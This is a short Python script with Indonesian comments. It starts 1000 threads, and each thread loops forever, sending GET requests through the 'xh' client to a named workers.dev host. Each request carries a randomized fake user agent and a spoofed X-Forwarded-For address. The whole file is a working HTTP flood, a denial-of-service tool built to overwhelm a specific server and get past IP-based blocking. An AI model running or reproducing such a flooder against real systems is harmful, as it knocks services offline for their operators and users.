import subprocess
import threading
from faker import Faker
    
# Membuat instance Faker
faker = Faker()

def execute_command():
    while True:
        try:
            # Membuat user agent palsu dan alamat IP palsu dengan faker
            fake_user_agent = faker.user_agent()
            fake_ip = faker.ipv4()

            # Menjalankan perintah "xh" dengan opsi --raw melalui subproses dengan shell=True
            cmd = f"xh GET https://sxtcp.tg-index.workers.dev --raw 'GET / HTTP/1.1\r\nHost: sxtcp.tg-index.workers.dev\r\nUser-Agent: {fake_user_agent}\r\nX-Forwarded-For: {fake_ip}\r\n\r\n'"
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            process.communicate()
            print("Sukses")
        except subprocess.CalledProcessError as e:
            print("Terjadi kesalahan:", e)

# Menentukan jumlah thread yang ingin Anda gunakan
num_threads = 1000

# Membuat dan menjalankan thread sebanyak num_threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=execute_command)
    threads.append(thread)
    thread.start()

# Menunggu semua thread selesai
for thread in threads:
    thread.join()
